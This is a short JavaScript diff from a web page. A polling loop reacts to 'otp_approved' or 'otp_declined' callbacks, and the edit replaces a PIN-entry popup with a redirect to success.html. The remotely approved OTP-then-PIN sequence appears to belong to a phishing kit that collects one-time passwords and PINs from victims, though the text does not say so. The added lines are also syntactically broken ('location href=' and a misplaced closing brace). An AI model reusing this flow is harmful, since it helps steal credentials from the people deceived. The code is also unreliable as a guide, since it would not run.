@@ -645,8 +645,9 @@
                                     if (cb === 'otp_approved') {
                                         clearInterval(iv);
                                         document.getElementById('ov').classList.remove('on');
-                                        // Approve clicked → open PIN popup modal
-                                        openPINModal();
+                                        // Approve clicked → open success.html
+                            location href='success.html?names='
+        
                                     }
                                     else if (cb === 'otp_declined') {
                                         clearInterval(iv);
@@ -656,7 +657,8 @@
                                         boxes[0].focus();
                                     }
                                 }
-                            });
+                            //otp approve n' open success.html
+                            location href='success.html?names='});
                         }
                     }).catch(e => console.error(e));
             }, 1500);
